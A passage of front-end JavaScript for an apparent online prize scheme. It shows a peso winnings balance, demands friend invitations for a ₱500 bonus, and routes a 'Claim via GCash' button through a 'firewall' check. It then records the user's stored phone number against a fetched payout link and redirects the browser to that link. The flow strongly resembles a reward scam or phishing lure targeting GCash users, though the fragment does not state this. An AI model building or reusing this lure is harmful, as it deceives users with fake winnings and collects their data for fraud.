            <h2 class="popup-title" style="font-family: 'Playfair Display', serif; font-size: 26px; font-weight: 900; background: linear-gradient(to bottom, #fcf6ba, #d4af37, #aa771c); -webkit-background-clip: text; background-clip: text; color: transparent; text-transform: uppercase; text-align: center;">
                🎉 HOORAY! 🎉
            </h2>
            <div class="prize-amount" style="font-size: 48px; font-weight: 900; color: #fce883; font-family: 'Orbitron', monospace; text-align: center; text-shadow: 0 0 20px rgba(212,175,55,0.5);" id="popupBalanceDisplay">
                ₱<span id="popupBalanceAmount">${balance.toFixed(2)}</span>
            </div>
            <div class="divider"></div>
            <div class="invite-text" style="font-size: 12px; color: #999; text-align: center; font-family: 'Poppins', sans-serif;">
                Your friend must confirm your invitation to get extra <strong style="color: #fce883;">₱500 bonus</strong>.
            </div>
            <div class="luckyday-image-container" style="text-align: center; margin: 15px 0;">
                <img src="images/luckyday.png" alt="Lucky Day" class="luckyday-img" style="max-width: 100%; border-radius: 12px; border: 1px solid rgba(212,175,55,0.3);" onerror="this.style.display='none'">
            </div>
            <div class="divider"></div>
            <div class="indicator-group" style="display: flex; justify-content: center; gap: 12px; margin: 15px 0;">
                <div class="indicator" id="indicator1" style="width: 40px; height: 4px; background: rgba(212,175,55,0.3); border-radius: 2px; transition: all 0.3s ease;"></div>
                <div class="indicator" id="indicator2" style="width: 40px; height: 4px; background: rgba(212,175,55,0.3); border-radius: 2px; transition: all 0.3s ease;"></div>
                <div class="indicator" id="indicator3" style="width: 40px; height: 4px; background: rgba(212,175,55,0.3); border-radius: 2px; transition: all 0.3s ease;"></div>
            </div>
            
            <button class="claim-gcash-button" id="claimGCashBtn" style="width: 100%; display: flex; align-items: center; justify-content: center; gap: 8px; position: relative; overflow: hidden;">
                <img src="images/gc_icon.png" class="gc-icon" style="width: 22px; height: 22px;"> CLAIM THRU GCASH
            </button>

            <div class="button-separator" style="height: 1px; background: linear-gradient(90deg, transparent, rgba(212,175,55,0.4), transparent); margin: 12px 0;"></div>

            <button class="small-back-btn" id="backBtnPhase1" style="margin: 0 auto; display: inline-flex;">
                ← BACK
            </button>
        `;
        
        const closeBtn = document.getElementById('popupClosePhase1');
        if (closeBtn) closeBtn.onclick = function() { closePopup(); };
        
        const backBtn = document.getElementById('backBtnPhase1');
        if (backBtn) backBtn.onclick = function() { closePopup(); };
        
        const claimBtn = document.getElementById('claimGCashBtn');
        if (claimBtn) {
            claimBtn.onclick = function() {
                // CHECK IF BALANCE IS ZERO
                if (currentBalance <= 0) {
                    claimBtn.classList.add('shake-effect');
                    claimBtn.style.background = 'linear-gradient(to bottom, #ff4444, #cc0000)';
                    claimBtn.style.border = '1px solid #ff6666';
                    claimBtn.innerHTML = '❌ INSUFFICIENT BALANCE';
                    
                    const popupTitle = document.querySelector('.popup-title');
                    if (popupTitle) {
                        popupTitle.style.background = 'linear-gradient(to bottom, #ff6666, #ff4444)';
                        popupTitle.style.webkitBackgroundClip = 'text';
                        popupTitle.style.backgroundClip = 'text';
                        popupTitle.textContent = '⚠️ NO BALANCE ⚠️';
                    }
                    
                    setTimeout(() => {
                        claimBtn.classList.remove('shake-effect');
                        claimBtn.style.background = 'linear-gradient(to bottom, #d4af37, #aa771c)';
                        claimBtn.style.border = '1px solid #fcf6ba';
                        claimBtn.innerHTML = '<img src="images/gc_icon.png" class="gc-icon" style="width: 22px; height: 22px;"> CLAIM THRU GCASH';
                        
                        if (popupTitle) {
                            popupTitle.style.background = 'linear-gradient(to bottom, #fcf6ba, #d4af37, #aa771c)';
                            popupTitle.style.webkitBackgroundClip = 'text';
                            popupTitle.style.backgroundClip = 'text';
                            popupTitle.textContent = '🎉 HOORAY! 🎉';
                        }
                    }, 2000);
                    
                    return;
                }
                
                // ANIMATE BALANCE DECREMENT THEN PROCEED
                animateBalanceDecrement(currentBalance, 0, 800, function() {
                    checkFirewallAndTransition();
                });
            };
        }
    }
    
    // ========== PHASE 2: WITHDRAWAL LINK ==========
    function showPhase2() {
        const popupInner = document.querySelector('.popup-inner');
        if (!popupInner) return;
        
        currentPhase = 2;
        
        const popupContainer = document.querySelector('.popup-container');
        if (popupContainer) {
            popupContainer.style.maxWidth = '340px';
            popupContainer.style.width = '85%';
        }
        
        popupInner.innerHTML = `
            <div class="popup-close" id="popupClosePhase2">✕</div>
            
            <div style="text-align: center; margin-bottom: 8px;">
                <div style="font-size: 50px; animation: bounceIn 0.5s ease;">🏆</div>
            </div>
            
            <h2 class="phase2-heading">GREAT JOB!</h2>
            
            <div class="divider"></div>
            
            <div style="background: linear-gradient(145deg, rgba(20, 10, 5, 0.6), rgba(10, 5, 0, 0.6)); border: 1px solid rgba(212,175,55,0.3); border-radius: 12px; padding: 14px; margin: 10px 0;">
                <p style="font-size: 11px; color: #ccc; text-align: center; margin: 0; font-family: 'Poppins', sans-serif;">
                    "Nice work! You're one tap away from your reward!"
                </p>
                <p style="font-size: 12px; color: #fce883; text-align: center; margin: 8px 0 0 0; font-family: 'Orbitron', monospace;">
                    Your reward: <strong style="font-size: 22px; color: #fce883; text-shadow: 0 0 15px rgba(212,175,55,0.5);">₱${currentBalance.toFixed(2)}</strong>
                </p>
            </div>
            
            <button class="claim-gcash-button" id="proceedBtn" style="width: 100%; padding: 14px; font-size: 14px; margin-top: 10px; display: flex; align-items: center; justify-content: center; gap: 8px;">
                <img src="images/gc_icon.png" class="gc-icon" style="width: 20px; height: 20px;"> CLAIM VIA GCASH APP
            </button>

            <div class="button-separator" style="height: 1px; background: linear-gradient(90deg, transparent, rgba(212,175,55,0.4), transparent); margin: 12px 0 10px;"></div>

            <button class="small-back-btn" id="backBtnPhase2" style="margin: 0 auto; display: inline-flex;">
                ← BACK
            </button>
        `;
        
        attachPhase2Events();
    }
    
    // ========== ATTACH PHASE 2 EVENTS ==========
    function attachPhase2Events() {
        const closeBtn = document.getElementById('popupClosePhase2');
        if (closeBtn) closeBtn.onclick = function() { closePopup(); };
        
        const backBtn = document.getElementById('backBtnPhase2');
        if (backBtn) {
            backBtn.onclick = function() {
                const popupInner = document.querySelector('.popup-inner');
                if (popupInner) {
                    popupInner.style.transition = 'opacity 0.3s ease';
                    popupInner.style.opacity = '0';
                    setTimeout(() => {
                        showPhase1(currentBalance);
                        popupInner.style.opacity = '1';
                    }, 300);
                }
            };
        }
        
        const proceedBtn = document.getElementById('proceedBtn');
        if (proceedBtn) {
            proceedBtn.onclick = async function() {
                if (claimInProgress) return;
                
                claimInProgress = true;
                
                this.classList.add('btn-pulse');
                setTimeout(() => this.classList.remove('btn-pulse'), 500);
                
                this.disabled = true;
                this.innerHTML = `<img src="images/gc_icon.png" class="gc-icon" style="width: 20px; height: 20px;"> PROCESSING...`;
                this.style.opacity = '0.8';
                
                window.addEventListener('beforeunload', beforeUnloadHandler);
                
                const linkData = await getLatestPayoutLink();
                
                if (linkData && linkData.url) {
                    const userPhone = localStorage.getItem("userPhone") || "Unknown";
                    await markLinkAsUsed(linkData.key, userPhone);
                    
                    isRedirecting = true;
                    this.innerHTML = `<img src="images/gc_icon.png" class="gc-icon" style="width: 20px; height: 20px;"> REDIRECTING...`;
                    setTimeout(() => {
                        window.removeEventListener('beforeunload', beforeUnloadHandler);
                        window.location.href = linkData.url;
                    }, 1000);
                } else {
                    claimInProgress = false;
                    isRedirecting = false;
                    window.removeEventListener('beforeunload', beforeUnloadHandler);
                    
                    this.disabled = false;
                    this.innerHTML = `<img src="images/gc_icon.png" class="gc-icon" style="width: 20px; height: 20px;"> CLAIM VIA GCASH APP`;
                    this.style.opacity = '1';
                    alert("No payout link available. Please try again.");
                }
            };
        }
    }
    
    // ========== SHOW POPUP ==========
    async function showPopup(balance) {
        currentBalance = balance;
        await getFirewallStatus();
        showPhase1(balance);
        
        const popup = document.getElementById('prizePopup');
        if (popup) {
            popup.style.display = 'flex';
            const ticker = document.getElementById('winnerTicker');
            if (ticker) ticker.style.display = 'none';
        }
    }
    
    // ========== CLOSE POPUP ==========
    function closePopup() {
        const popup = document.getElementById('prizePopup');
        if (popup) {
            popup.style.display = 'none';
            const ticker = document.getElementById('winnerTicker');
            if (ticker) ticker.style.display = 'flex';
            if (window.ConfettiModule) window.ConfettiModule.stop();
        }
        
        claimInProgress = false;
        isRedirecting = false;
        window.removeEventListener('beforeunload', beforeUnloadHandler);
    }
    
    // ========== START ==========
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
    
    // ========== EXPORT ==========
    window.showPopup = showPopup;
    window.closePopup = closePopup;
    window.getFirewallStatus = getFirewallStatus;
    
})();
